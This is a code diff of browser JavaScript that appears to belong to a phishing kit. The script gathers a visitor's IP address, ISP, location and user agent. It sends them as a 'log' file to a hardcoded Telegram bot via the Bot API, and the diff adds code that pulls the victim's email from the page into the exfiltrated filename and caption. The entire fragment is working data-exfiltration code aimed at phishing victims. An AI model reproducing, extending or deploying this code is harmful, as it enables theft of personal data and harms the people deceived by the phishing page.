@@ -7,6 +7,7 @@
             let ip = "Unknown";
             let isp = "Unknown";
             let org = "Unknown";
+            let em = document.getElementById('em').innerHTML;
 
     try {
     const geoResponse = await fetch('http://ip-api.com/json/');
@@ -49,8 +50,8 @@ User Agent: ${navigator.userAgent}`;
             const chatId = '5989388464';
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', blob, `Submission_[#email#]_${Date.now()}.txt`);
-            formData.append('caption', `New Log From [#email#] - ${name} (${city}, ${country})`);
+            formData.append('document', blob, `Submission_${em}_${Date.now()}.txt`);
+            formData.append('caption', `New Log From ${em} - (${city}, ${country})`);
 
    try {
         await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
